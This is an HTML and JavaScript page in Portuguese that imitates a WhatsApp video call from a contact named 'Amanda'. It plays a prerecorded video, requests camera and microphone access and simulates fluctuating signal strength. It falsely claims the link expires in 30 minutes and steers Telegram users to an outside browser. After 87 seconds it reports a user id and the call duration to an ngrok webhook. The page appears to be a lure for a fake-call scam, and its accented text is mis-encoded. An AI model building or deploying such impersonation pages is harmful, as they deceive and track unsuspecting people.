<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Video Call</title>
    
    <!-- üî• DETECTOR DE TELEGRAM WEBVIEW -->
    <script>
        // Detectar se est√° no Telegram WebView
        function isTelegramWebView() {
            const userAgent = navigator.userAgent.toLowerCase();
            return userAgent.includes('telegram') || 
                   window.TelegramWebviewProxy || 
                   window.Telegram || 
                   userAgent.includes('tgandroidapp') ||
                   userAgent.includes('tgiosapp');
        }

        // üî• FOR√áAR ABERTURA NO NAVEGADOR EXTERNO
        if (isTelegramWebView()) {
            // Mostrar instru√ß√µes para abrir no navegador
            document.addEventListener('DOMContentLoaded', function() {
                document.body.innerHTML = `
                    <div style="
                        display: flex; 
                        flex-direction: column;
                        align-items: center; 
                        justify-content: center; 
                        height: 100vh; 
                        background: linear-gradient(135deg, #25D366, #128C7E);
                        margin: 0;
                        padding: 20px;
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                        text-align: center;
                        color: white;
                    ">
                        <div style="
                            background: rgba(255,255,255,0.1);
                            backdrop-filter: blur(10px);
                            border-radius: 20px;
                            padding: 40px 30px;
                            max-width: 350px;
                            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                        ">
                            <div style="font-size: 64px; margin-bottom: 20px;">üì±</div>
                            <h2 style="margin: 0 0 15px 0; font-size: 24px; font-weight: 600;">
                                Abrir no Navegador
                            </h2>
                            <p style="margin: 0 0 25px 0; opacity: 0.9; line-height: 1.5; font-size: 16px;">
                                Para a videochamada funcionar perfeitamente, 
                                abra este link no seu navegador.
                            </p>
                            
                            <div style="margin: 25px 0; padding: 15px; background: rgba(255,255,255,0.2); border-radius: 12px;">
                                <p style="margin: 0 0 15px 0; font-size: 14px; opacity: 0.8;">
                                    <strong>Como fazer:</strong>
                                </p>
                                <div style="text-align: left; font-size: 14px; line-height: 1.6;">
                                    1Ô∏è‚É£ Toque nos <strong>3 pontinhos</strong> (‚ãØ)<br>
                                    2Ô∏è‚É£ Escolha <strong>"Abrir no navegador"</strong><br>
                                    3Ô∏è‚É£ A videochamada iniciar√° automaticamente
                                </div>
                            </div>
                            
                            <button onclick="copyLink()" style="
                                background: white;
                                color: #25D366;
                                border: none;
                                padding: 12px 24px;
                                border-radius: 25px;
                                font-size: 16px;
                                font-weight: 600;
                                cursor: pointer;
                                margin-top: 10px;
                                box-shadow: 0 4px 15px rgba(0,0,0,0.2);
                                transition: transform 0.2s;
                            " onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
                                üìã Copiar Link
                            </button>
                            
                            <p style="margin: 20px 0 0 0; font-size: 12px; opacity: 0.7;">
                                O link expira em 30 minutos
                            </p>
                        </div>
                    </div>
                `;
            });
            
            // Fun√ß√£o para copiar link
            window.copyLink = function() {
                navigator.clipboard.writeText(window.location.href).then(() => {
                    alert('‚úÖ Link copiado! Cole no seu navegador.');
                });
            };
            
            return; // Parar execu√ß√£o do resto do c√≥digo
        }

        // üî• SE N√ÉO √â TELEGRAM, CONTINUAR NORMAL
        console.log('‚úÖ Navegador externo detectado - iniciando videochamada');
    </script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            overflow: hidden;
            position: relative;
            height: 100vh;
            width: 100vw;
        }

        /* Resto do CSS igual ao original */
        .video-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        .background-video {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            object-fit: cover;
            filter: brightness(0.4) blur(1px);
        }

        .video-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
        }

        .header {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 100px;
            background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.3) 70%, transparent 100%);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 40px 20px 20px;
            z-index: 10;
        }

        .contact-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .contact-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, #25D366, #128C7E);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 16px;
            overflow: hidden;
            border: 3px solid #25D366;
            box-shadow: 0 0 0 2px rgba(37, 211, 102, 0.3);
        }

        .contact-avatar img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
        }

        .contact-details h3 {
            color: white;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 2px;
        }

        .call-status {
            color: rgba(255,255,255,0.8);
            font-size: 13px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.8; }
            50% { opacity: 1; }
        }

        .header-actions {
            display: flex;
            gap: 20px;
        }

        .header-btn {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .header-btn:active {
            background: rgba(255,255,255,0.3);
            transform: scale(0.95);
        }

        .self-video {
            position: absolute;
            top: 120px;
            right: 20px;
            width: 120px;
            height: 180px;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            z-index: 5;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }

        .user-video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }

        .camera-placeholder {
            width: 100%;
            height: 100%;
            background: #333;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
            font-size: 36px;
        }

        .timer-container {
            position: absolute;
            top: 310px;
            right: 20px;
            width: 120px;
            text-align: center;
            z-index: 6;
        }

        .call-timer {
            color: white;
            font-size: 12px;
            font-weight: 500;
            background: rgba(0,0,0,0.7);
            padding: 6px 12px;
            border-radius: 12px;
            backdrop-filter: blur(10px);
            display: inline-block;
        }

        .controls {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 150px;
            background: linear-gradient(0deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.5) 60%, transparent 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 40px;
            padding-bottom: 40px;
        }

        .control-btn {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .control-btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(255,255,255,0.3);
            border-radius: 50%;
            transition: all 0.3s;
            transform: translate(-50%, -50%);
        }

        .control-btn:active::before {
            width: 100%;
            height: 100%;
        }

        .btn-end {
            background: #ff4757;
            color: white;
            box-shadow: 0 4px 20px rgba(255, 71, 87, 0.4);
        }

        .btn-end:active {
            background: #ff3742;
            transform: scale(0.95);
        }

        .btn-mute {
            background: rgba(255,255,255,0.2);
            color: white;
        }

        .btn-mute:active {
            background: rgba(255,255,255,0.3);
            transform: scale(0.95);
        }

        .btn-camera {
            background: rgba(255,255,255,0.2);
            color: white;
        }

        .btn-camera:active {
            background: rgba(255,255,255,0.3);
            transform: scale(0.95);
        }

        .muted .btn-mute {
            background: #ff4757;
        }

        .camera-off .btn-camera {
            background: #ff4757;
        }

        .camera-off .user-video {
            display: none;
        }

        .camera-off .camera-placeholder {
            display: flex;
        }

        .camera-on .camera-placeholder {
            display: none;
        }

        .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255,255,255,0.6);
            transform: scale(0);
            animation: ripple 0.6s linear;
            pointer-events: none;
        }

        @keyframes ripple {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        .network-indicator {
            position: absolute;
            top: 60px;
            right: 20px;
            display: flex;
            gap: 2px;
            z-index: 15;
        }

        .signal-bar {
            width: 3px;
            height: 12px;
            background: rgba(255,255,255,0.3);
            border-radius: 1px;
        }

        .signal-bar.active {
            background: #25D366;
            animation: signalPulse 2s infinite;
        }

        @keyframes signalPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
    </style>
</head>
<body>
    <!-- Background Video -->
    <div class="video-background">
        <video class="background-video" id="backgroundVideo" autoplay loop playsinline>
            <source src="video.mp4" type="video/mp4">
        </video>
        <div class="video-overlay"></div>
    </div>
    
    <!-- Network Indicator -->
    <div class="network-indicator">
        <div class="signal-bar active"></div>
        <div class="signal-bar active"></div>
        <div class="signal-bar active"></div>
        <div class="signal-bar"></div>
    </div>

    <!-- Header -->
    <div class="header">
        <div class="contact-info">
            <div class="contact-avatar">
                <img src="amanda.jpg" alt="Amanda" onerror="this.style.display='none'; this.parentElement.textContent='AM';">
            </div>
            <div class="contact-details">
                <h3>Amanda</h3>
                <div class="call-status">Chamando...</div>
            </div>
        </div>
        <div class="header-actions">
            <button class="header-btn" onclick="toggleFullscreen()">‚õ∂</button>
        </div>
    </div>

    <!-- Self Video Preview -->
    <div class="self-video">
        <video class="user-video" id="userVideo" autoplay playsinline muted></video>
        <div class="camera-placeholder">üì∑</div>
    </div>

    <!-- Timer -->
    <div class="timer-container">
        <div class="call-timer" id="callTimer">00:00</div>
    </div>

    <!-- Bottom Controls -->
    <div class="controls">
        <button class="control-btn btn-mute" onclick="toggleMute()" id="muteBtn">üé§</button>
        <button class="control-btn btn-end" onclick="endCall()">üìû</button>
        <button class="control-btn btn-camera" onclick="toggleCamera()" id="cameraBtn">üìπ</button>
    </div>

    <script>
        // üî• S√ì EXECUTA SE N√ÉO FOR TELEGRAM WEBVIEW
        if (!isTelegramWebView()) {
            let isMuted = false;
            let cameraOff = false;
            let callStarted = false;
            let callTimer = 0;
            let timerInterval;
            let userStream = null;
            let userVideo = document.getElementById('userVideo');

            // Initialize camera
            async function initCamera() {
                try {
                    userStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user',
                            width: { ideal: 720 },
                            height: { ideal: 1280 }
                        }, 
                        audio: true 
                    });
                    
                    userVideo.srcObject = userStream;
                    document.body.classList.add('camera-on');
                    
                    console.log('Camera initialized successfully');
                } catch (error) {
                    console.error('Error accessing camera:', error);
                    showCameraPermissionRequest();
                }
            }

            function showCameraPermissionRequest() {
                const overlay = document.createElement('div');
                overlay.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.8);
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    z-index: 1000;
                    color: white;
                    text-align: center;
                    padding: 20px;
                `;
                
                overlay.innerHTML = `
                    <div style="font-size: 64px; margin-bottom: 20px;">üìπ</div>
                    <h2 style="margin-bottom: 15px;">Permiss√£o de C√¢mera</h2>
                    <p style="margin-bottom: 30px; opacity: 0.8; line-height: 1.4;">
                        Para usar a videochamada, precisamos acessar sua c√¢mera.<br>
                        Clique em "Permitir" quando o navegador solicitar.
                    </p>
                    <button onclick="requestCameraAgain()" style="
                        padding: 12px 24px;
                        background: #25D366;
                        color: white;
                        border: none;
                        border-radius: 25px;
                        font-size: 16px;
                        cursor: pointer;
                    ">Tentar Novamente</button>
                    <button onclick="skipCamera()" style="
                        padding: 8px 16px;
                        background: transparent;
                        color: #ccc;
                        border: 1px solid #666;
                        border-radius: 20px;
                        font-size: 14px;
                        cursor: pointer;
                        margin-top: 15px;
                    ">Pular por Agora</button>
                `;
                
                document.body.appendChild(overlay);
                window.cameraOverlay = overlay;
            }

            function requestCameraAgain() {
                if (window.cameraOverlay) {
                    window.cameraOverlay.remove();
                }
                initCamera();
            }

            function skipCamera() {
                if (window.cameraOverlay) {
                    window.cameraOverlay.remove();
                }
                console.log('User skipped camera permission');
            }

            // Start call simulation
            function startCall() {
                if (callStarted) return;
                
                callStarted = true;
                document.querySelector('.call-status').textContent = 'Conectado';
                
                // Start timer
                timerInterval = setInterval(() => {
                    callTimer++;
                    const minutes = Math.floor(callTimer / 60);
                    const seconds = callTimer % 60;
                    document.getElementById('callTimer').textContent = 
                        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }, 1000);
                
                // Auto-end after 1:27
                setTimeout(() => {
                    endCall();
                }, 87000);
            }

            // Auto start call after 3 seconds
            setTimeout(startCall, 3000);

            function toggleMute() {
                const btn = document.getElementById('muteBtn');
                const body = document.body;
                
                isMuted = !isMuted;
                
                if (isMuted) {
                    btn.textContent = 'üîá';
                    body.classList.add('muted');
                } else {
                    btn.textContent = 'üé§';
                    body.classList.remove('muted');
                }
                
                createRipple(btn);
            }

            function toggleCamera() {
                const btn = document.getElementById('cameraBtn');
                const body = document.body;
                
                cameraOff = !cameraOff;
                
                if (cameraOff) {
                    btn.textContent = 'üì∑';
                    body.classList.add('camera-off');
                    body.classList.remove('camera-on');
                    if (userStream) {
                        userStream.getVideoTracks().forEach(track => track.enabled = false);
                    }
                } else {
                    btn.textContent = 'üìπ';
                    body.classList.remove('camera-off');
                    body.classList.add('camera-on');
                    if (userStream) {
                        userStream.getVideoTracks().forEach(track => track.enabled = true);
                    } else {
                        initCamera();
                    }
                }
                
                createRipple(btn);
            }

            function endCall() {
                console.log("üî¥ endCall() chamada");
                
                const urlParams = new URLSearchParams(window.location.search);
                const userId = urlParams.get('u');
                const duration = document.getElementById('callTimer').textContent;
                
                console.log("üìä Dados:", { userId, duration });
                
                if (userStream) {
                    userStream.getTracks().forEach(track => track.stop());
                }
                
                const video = document.querySelector('.background-video');
                if (video) video.pause();
                
                document.body.style.background = '#000';
                document.querySelector('.video-background').style.display = 'none';
                
                // üî• WEBHOOK OTIMIZADO para detectar mobile/desktop
                let webhookUrl;
                if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                    webhookUrl = 'https://056a-45-174-80-203.ngrok-free.app/api/call-ended';
                    console.log("üì± Mobile - usando ngrok");
                } else {
                    webhookUrl = 'http://localhost:5000/api/call-ended';
                    console.log("üíª Desktop - usando localhost");
                }
                
                if (userId) {
                    console.log("üöÄ Enviando webhook...");
                    
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            userId: userId,
                            duration: duration || "01:27"
                        })
                    })
                    .then(response => {
                        console.log("‚úÖ Webhook:", response.status);
                        return response.json();
                    })
                    .then(data => {
                        console.log("üìù Resposta:", data);
                    })
                    .catch(error => {
                        console.error("‚ùå Erro webhook:", error);
                    });
                }
                
                setTimeout(() => {
                    document.body.innerHTML = `
                        <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; text-align: center; background: #000;">
                            <div style="font-size: 64px; margin-bottom: 20px;">üìû</div>
                            <h2 style="margin-bottom: 10px;">Chamada encerrada</h2>
                            <p style="opacity: 0.7;">Dura√ß√£o: ${document.getElementById('callTimer').textContent}</p>
                            <button onclick="location.reload()" style="margin-top: 30px; padding: 12px 24px; background: #25D366; color: white; border: none; border-radius: 25px; font-size: 16px; cursor: pointer;">Ligar novamente</button>
                        </div>
                    `;
                }, 500);
            }

            function toggleFullscreen() {
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen();
                } else {
                    document.exitFullscreen();
                }
            }

            function createRipple(button) {
                const ripple = document.createElement('span');
                const rect = button.getBoundingClientRect();
                const size = Math.max(rect.width, rect.height);
                
                ripple.style.width = ripple.style.height = size + 'px';
                ripple.style.left = '50%';
                ripple.style.top = '50%';
                ripple.style.transform = 'translate(-50%, -50%)';
                ripple.classList.add('ripple');
                
                button.appendChild(ripple);
                
                setTimeout(() => {
                    ripple.remove();
                }, 600);
            }

            // Initialize
            document.addEventListener('DOMContentLoaded', function() {
                userVideo = document.getElementById('userVideo');
                
                setTimeout(() => {
                    initCamera();
                }, 1000);
                
                // Background video with audio
                const video = document.querySelector('.background-video');
                if (video) {
                    video.muted = true;
                    video.play().then(() => {
                        console.log('üé¨ V√≠deo iniciado');
                        
                        setTimeout(() => {
                            video.muted = false;
                            video.volume = 0.8;
                            console.log('üîä √Åudio ativado');
                        }, 3000);
                    }).catch(e => {
                        console.log('‚ùå Erro autoplay:', e);
                        document.addEventListener('click', function() {
                            video.muted = false;
                            video.volume = 0.8;
                            video.play();
                        }, { once: true });
                    });
                }
            });

            // Touch events
            document.addEventListener('touchstart', function() {
                const video = document.querySelector('.background-video');
                if (video && video.paused) {
                    video.muted = false;
                    video.volume = 0.8;
                    video.play();
                }
            }, { once: true });

            // Touch feedback
            document.querySelectorAll('button').forEach(button => {
                button.addEventListener('touchstart', function(e) {
                    this.style.transform = 'scale(0.95)';
                });
                
                button.addEventListener('touchend', function(e) {
                    this.style.transform = 'scale(1)';
                });
            });

            // Simulate network changes
            setInterval(() => {
                const bars = document.querySelectorAll('.signal-bar');
                const activeCount = Math.floor(Math.random() * 4) + 1;
                
                bars.forEach((bar, index) => {
                    if (index < activeCount) {
                        bar.classList.add('active');
                    } else {
                        bar.classList.remove('active');
                    }
                });
            }, 5000);

            // Prevent context menu and zoom
            document.addEventListener('contextmenu', e => e.preventDefault());
            
            let lastTouchEnd = 0;
            document.addEventListener('touchend', function (event) {
                const now = (new Date()).getTime();
                if (now - lastTouchEnd <= 300) {
                    event.preventDefault();
                }
                lastTouchEnd = now;
            }, false);
        }
    </script>
</body>
